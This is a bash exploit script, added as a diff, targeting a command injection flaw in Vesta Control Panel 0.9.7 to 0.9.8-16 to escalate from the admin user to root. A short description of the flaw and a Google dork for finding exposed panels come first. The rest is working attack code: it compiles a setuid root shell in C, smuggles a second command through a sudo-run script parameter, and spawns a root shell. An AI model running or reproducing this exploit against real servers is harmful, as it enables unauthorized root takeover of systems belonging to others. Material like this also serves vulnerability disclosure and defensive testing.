@@ -1,0 +1,48 @@
+#!/bin/bash
+# 
+# Exploit Title: Vesta Control Panel 0.9.7 <= 0.9.8-16 Local Privilege Escalation Exploit
+# Google Dork: vesta control panel inurl:8083
+# Exploit Author: Luka Pusic @lukapusic, Jaka Hudoklin @offlinehacker
+# Vendor Homepage: http://vestacp.com/
+# Software Link: https://github.com/serghey-rodin/vesta
+# Version: 0.9.7 - 0.9.8-16
+#
+# Description:
+# Vesta CP default install script adds /usr/local/vesta/bin/ directory into
+# /etc/sudoers.d with the NOPASSWD option for the default "admin" user. All
+# programs in /usr/local/vesta/bin/ directory can therefore be run as root. A
+# command injection vulnerability in "v-get-web-domain-value" script can be
+# exploited to run arbitrary commands and escalate from admin user to root.
+#
+# Vulnerability:
+# Parameter $3 (key) in v-get-web-domain-value is not properly sanitized before
+# being passed to bash eval.
+#
+#
+
+# Navigate to a writeable directory, usually /tmp.
+cd /tmp
+
+# Write a simple C suid shell to suid.c.
+cat > suid.c << _EOF
+int main(void) {
+       setgid(0); setuid(0);
+       execl("/bin/sh","sh",0); }
+_EOF
+
+# Compile suid shell with gcc.
+# [!] If there is no gcc on the system deploy a precompiled binary manually.
+gcc suid.c -o suid
+
+# Create a shell script called PWN that will be run as root.
+# PWN will weaponize ./suid with executable permissions and suid bit.
+echo "chown root:root suid; chmod 777 suid; chmod +s suid;" > PWN
+
+# Make PWN shell script executable.
+chmod +x PWN
+
+# Inject command to run PWN into v-get-web-domain-value parameter $3.
+sudo /usr/local/vesta/bin/v-get-web-domain-value 'admin' 'domain.com' 'x; ./PWN;'
+
+# Spawn the root shell.
+./suid
